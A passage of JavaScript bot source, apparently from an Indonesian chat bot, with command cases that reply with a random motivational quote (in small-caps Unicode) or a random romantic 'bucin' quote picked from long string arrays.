"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
]
let motivasii = pickRandom(motivasi)
    reply(`"${motivasii}"`)
}
break
case 'quotesbucin': {
const bucin = [
    "Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
    "Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
    "Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
    "Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
    "Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
    "Pacar orang adalah jodoh kita yang tertunda.",
    "Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
    "Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
    "Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
    "Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
    "Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
    "Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
    "Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
    "Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
    "Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
    "Aku ingin menjadi satu-satunya, bukan salah satunya.",
    "Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
    "Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
    "Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
    "Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
    "Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
    "Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
    "Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
    "Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
    "Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
    "Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
    "Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
    "Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
    "Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
    "Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
    "Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
    "Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
    "Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
    "Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
    "Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
    "Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
    "PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
    "Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
    "Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
    "Makan apapun aku suka asal sama kamu, termasuk makan ati.",
    "Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
    "Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
    "Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
    "Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
    "Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
    "Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
    "Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
    "Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
    "Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
    "Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
    "Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
    "Denganmu, jatuh cinta adalah patah hati paling sengaja.",
    "Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
    "Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
    "Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
    "Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
    "Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
    "Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
    "Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
    "Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
    "Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
    "Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
    "Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
    "Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
    "Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
    "Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
    "Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
    "Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
    "Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
    "Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
    "Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
